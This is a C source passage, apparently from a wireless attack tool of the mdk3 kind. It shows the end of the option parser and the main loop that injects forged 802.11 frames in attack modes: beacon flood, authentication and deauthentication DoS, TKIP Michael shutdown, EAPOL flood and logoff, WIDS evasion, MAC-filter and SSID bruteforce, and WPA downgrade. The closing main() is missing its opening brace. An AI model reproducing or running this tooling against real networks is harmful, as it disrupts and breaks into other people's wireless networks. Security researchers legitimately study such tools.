		target = parse_mac(argv[t+1]);
	    }
	    if (! strcmp(argv[t], "-s")) if (argc > t+1) {
		pps = strtol(argv[t+1], (char **) NULL, 10);
		usespeed = 1;
	    }
	    if (! strcmp(argv[t], "-r")) {
	        renderman_discovery = 1; 
	    }
	}
    break;
    case 'w':
	mode = 'w';
	for (t=3; t<argc; t++)
	{
	    if (! strcmp(argv[t], "-e")) if (argc > t+1) {
		essid_len = strlen(argv[t+1]);
		essid = (unsigned char *) malloc(essid_len);
		memcpy(essid, argv[t+1], essid_len);
		got_ssid = 1;
	    }
	    if (! strcmp(argv[t], "-c")) {
		if (argc > t+1) {
		    // There is a channel list given
		    init_channel_hopper(argv[t+1], 1);
		} else {
		    // No list given
		    init_channel_hopper(NULL, 1);
		}
	    }
	    if (! strcmp(argv[t], "-z")) {
		// Zero_Chaos attack
		zc_exploit = 1;
	    }
	}
    break;
    case 'm':
        mode = 'm';
        usespeed = 1;
        pps = 400;
	for (t=3; t<argc; t++)
	{
	    if (! strcmp(argv[t], "-t")) {
		if (! (argc > t+1)) { printf(use_mich); return -1; }
		target = parse_mac(argv[t+1]);
	    }
	    if (! strcmp(argv[t], "-n")) if (argc > t+1) {
		ppb = strtol(argv[t+1], (char **) NULL, 10);
	    }
	    if (! strcmp(argv[t], "-w")) if (argc > t+1) {
		wait = strtol(argv[t+1], (char **) NULL, 10);
	    }
	    if (! strcmp(argv[t], "-s")) if (argc > t+1) {
		pps = strtol(argv[t+1], (char **) NULL, 10);
		usespeed = 1;
	    }
	    if (! strcmp(argv[t], "-j")) {
		useqosexploit = 1;
	    }
	}
    break;
    case 'x':
	mode = 'x';
        if (argc < 4) { printf(use_eapo); return -1; }
        eapol_test = strtol(argv[3], (char **) NULL, 10);
        usespeed = 1;
        pps = 400;
        eapol_wtype = FLAG_AUTH_WPA;
        eapol_ucast = FLAG_TKIP;
        eapol_mcast = FLAG_TKIP;
	for (t=4; t<argc; t = t + 2)
	{
	    if (! strcmp(argv[t], "-n")) {
              if (! (argc > t+1)) { printf(use_eapo); return -1; }
              ssid = argv[t + 1];
	    }
	    if (! strcmp(argv[t], "-t")) {
		if (! (argc > t+1)) { printf(use_eapo); return -1; }
		target = parse_mac(argv[t+1]);
                memcpy(eapol_dst, target, ETHER_ADDR_LEN);
	    }
	    if (! strcmp(argv[t], "-c")) {
		if (! (argc > t+1)) { printf(use_eapo); return -1; }
		mac_sa = parse_mac(argv[t+1]);
                memcpy(eapol_src, mac_sa, ETHER_ADDR_LEN);
	    }
	    if (! strcmp(argv[t], "-s")) if (argc > t+1) {
		pps = strtol(argv[t+1], (char **) NULL, 10);
		usespeed = 1;
	    }
	    if (! strcmp(argv[t], "-w")) if (argc > t+1) {
		eapol_wtype = strtol(argv[t+1], (char **) NULL, 10);
	    }
	    if (! strcmp(argv[t], "-u")) if (argc > t+1) {
		eapol_ucast = strtol(argv[t+1], (char **) NULL, 10);
	    }
	    if (! strcmp(argv[t], "-m")) if (argc > t+1) {
		eapol_mcast = strtol(argv[t+1], (char **) NULL, 10);
	    }
	}
	break;
    case 'd':
	mode = 'd';
	for (t=3; t<argc; t++)
	{
	    if (! strcmp(argv[t], "-s")) if (argc > t+1) {
		pps = strtol(argv[t+1], (char **) NULL, 10);
		usespeed = 1;
	    }
	    if (! strcmp(argv[t], "-w")) if (argc > t+1) {
		if (wblist != 0) { printf(use_deau); return -1; }
		load_whitelist(argv[t+1]);
		list_file = argv[t+1];
		wblist = 1;
	    }
	    if (! strcmp(argv[t], "-b")) if (argc > t+1) {
		if (wblist != 0) { printf(use_deau); return -1; }
		load_whitelist(argv[t+1]);
		list_file = argv[t+1];
		wblist = 2;
	    }
	    if (! strcmp(argv[t], "-c")) {
		if (argc > t+1) {
		    // There is a channel list given
		    init_channel_hopper(argv[t+1], 3);
		} else {
		    // No list given
		    init_channel_hopper(NULL, 3);
		}
	    }
	}
    break;
    case 'f':
        mode = 'f';
        usespeed = 0;
	MAC_SET_NULL(mac_lower);
	MAC_SET_NULL(mac_base);
	for (t=3; t<argc; t++)
	{
	    if (! strcmp(argv[t], "-t")) {
		if (! (argc > t+1)) { printf(use_macb); return -1; }
		target =  parse_mac(argv[t+1]);
	    }
	    if (! strcmp(argv[t], "-m")) {
		if (! (argc > t+1)) { printf(use_macb); return -1; }
		mac_base = parse_half_mac(argv[t+1]);
	    }
	    if (! strcmp(argv[t], "-f")) {
		if (! (argc > t+1)) { printf(use_macb); return -1; }
		mac_base = parse_mac(argv[t+1]);
		mac_lower = parse_mac(argv[t+1]);
	    }
	}
    break;
    case 'g':
	mode = 'g';
	usespeed = 0;
	for (t=3; t<argc; t++)
	{
	    if (! strcmp(argv[t], "-t")) {
		if (! (argc > t+1)) { printf(use_wpad); return -1; }
		target = parse_mac(argv[t+1]);
	    }
	}
   break;
    default:
	printf(use_head);
	return -1;
	break;
    }

    printf("\n");

    if (renderman_discovery) {
        if (target != NULL) printf("WARNING: Target switch ignored in discovery mode.\n");
	if ((ssid == NULL) && (ssid_file_name == NULL)) {
	  printf("Please either specify an SSID or a filename with SSIDs to probe for\n");
          exit(-1);
	} else if ((ssid != NULL) && (ssid_file_name != NULL)) {
	  printf("Cannot use both options -e and -f at the same time.\n");
	  exit(-1);
	}
	mode = 'r';
	brute_ssid = ssid;
    }
    
    if ((mode == 'w') && (got_ssid == 0)) {
	printf("Please specify a target ESSID!\n\n");
	printf(use_wids);
	return -1;
    }
    if ((mode == 'P') && (usespeed == 0)) {
	usespeed = 1; pps = 300;
    }
    if ((mode == 'P') && (real_brute) && (target == NULL)) {
	printf("Please specify a target (-t <MAC>)\n");
	return -1;
    }
    if ((mode == 'p') && (ssid == NULL) && (ssid_file_name == NULL)) {
	printf("Please specify an ESSID (option -e) , a filename (option -f) or bruteforce mode (-b)\n");
	return -1;
    }
    if ((mode == 'P') && (target == NULL))
	printf("WARNING: No target (-t <MAC>) specified, will show ALL responses and stop on EOF!\n");
    if ((mode == 'p') && (target != NULL))
	printf("WARNING: Target ignored when not in Bruteforce mode\n");
    if (((mode == 'm') || (mode == 'f')) && (target == NULL))
    {
	if (! useqosexploit) {  // We need no target 
	    printf("Please specify MAC (option -t)\n");
	    return -1;
	}
    }
    if (mode == 'x') {
	if ( (target == NULL) && (eapol_test == EAPOL_TEST_START_FLOOD) ) {
          printf("Please specify MAC of target AP (option -t)\n");
          return -1;
        }
        if ( (ssid == NULL) && (eapol_test == EAPOL_TEST_START_FLOOD) ) {
          printf("Please specify a SSID (option -n)\n");
          return -1;
        }
        if ( (mac_sa == NULL) && (eapol_test == EAPOL_TEST_LOGOFF) ) {
          printf("Please specify MAC of target STA (option -c)\n");
          return -1;
        }
    }
    if (mode == 'g') {
	if (target == NULL) {
	    printf("Please specify MAC of target AP (option -t)\n");
	    return -1;
	}
    }

    /* Main packet sending loop */

    while(1)
    {

	/* Creating Packets, do sniffing */

	switch (mode)
	{
	case 'B':
	    if ((nb_sent % 30 == 0) || (total_time % 3 == 0))  // Switch Channel every 30 frames or 3 seconds
	    {
		if (fchan) {
		    osdep_set_channel(fchan);
		    chan = fchan;
		} else {
		    chan = generate_channel();
		    osdep_set_channel(chan);
		}
	    }
	    frm = create_beacon_frame(ssid, chan, wep, random_mac, gmode, adhoc, adv);
	    break;
	case 'b':
	    if (fchan) chan = fchan;
		else chan = generate_channel();
	    frm = create_beacon_frame(ssid, chan, wep, random_mac, gmode, adhoc, adv);
	    break;
	case 'a':  // Automated Auth DoS mode
	    if ((nb_sent % 512 == 0) || (total_time % 30 == 0))  // After 512 packets or 30 seconds, search for new target
	    {
		printf ("\rTrying to get a new target AP...                  \n");
		ap = get_target_ap();
	    }
	case 'A':  // Auth DoS mode with target MAC given
	    frm = create_auth_frame(ap, random_mac, NULL);
	    break;
	case 'i':  // Intelligent Auth DoS
	    frm = intelligent_auth_dos(random_mac);
	    break;
	case 'p':
	    mac = generate_mac(1);
	    frm = create_probe_frame(ssid, mac, NULL);
	    break;
	case 'P':
	    if (real_brute) {
		frm = ssid_brute_real();
	    } else {
		frm = ssid_brute();
	    }
	    break;
	case 'd':
	    frm = amok_machine(list_file);
	    break;
        case 'm':
            frm = false_tkip(target);
            break;
	case 'x':
            switch (eapol_test) {
              case EAPOL_TEST_START_FLOOD:
                frm = eapol_machine(ssid, strlen(ssid), target, eapol_wtype, eapol_ucast, eapol_mcast);
                break;
              case EAPOL_TEST_LOGOFF:
                frm = eapol_logoff(eapol_dst, eapol_src);
                break;
            }
	    break;
	case 'w':
	    frm = wids_machine();
	    break;
	case 'f':
	    frm = mac_bruteforcer();
	    break;
	case 'g':
	    frm = wpa_downgrade();
	    if (frm.data == NULL) goto statshortcut;
	    break;
	case 'r':
	    frm = renderman_discovery_tool();
	    break;
	}

	/* Sending packet, increase counters */

	if (frm.len < 10) printf("WTF?!? Too small packet injection detected! BUG!!!\n");
	osdep_send_packet(frm.data, frm.len);
	nb_sent_ps++;
	nb_sent++;
	if (useqosexploit) { nb_sent_ps += 3; nb_sent += 3; }	//Yes, I know... too lazy.

	/* User wants check for responses? */

	if ((mode=='a' || mode=='A') && ! check) check_auth(ap);
	if (mode=='p') resps += check_probe(mac);

	/* Does another thread want to exit? */

	if (exit_now) return 0;

	/* Waiting for Hannukah */

	if (usespeed) usleep(pps2usec(pps));

statshortcut:

	/* Print speed, packet count and stats every second */

	if( time( NULL ) - t_prev >= 1 )
        {
            t_prev = time( NULL );
	    print_stats(mode, frm, resps, nb_sent_ps);
	    if (mode != 'r') printf ("\rPackets sent: %6d - Speed: %4d packets/sec", nb_sent, nb_sent_ps);
	    fflush(stdout);
	    nb_sent_ps=0;
	    resps=0;
	    total_time++;
	}

	// Waiting for next burst in Michael Test
        if(! (nb_sent % ppb) && (mode == 'm'))
	    sleep(wait);

    }   // Play it again, Johnny!

    return 0;
}

/* MAIN */

int main( int argc, char *argv[] )

    int retval = mdk_parser(argc, argv);

    return( retval );
}
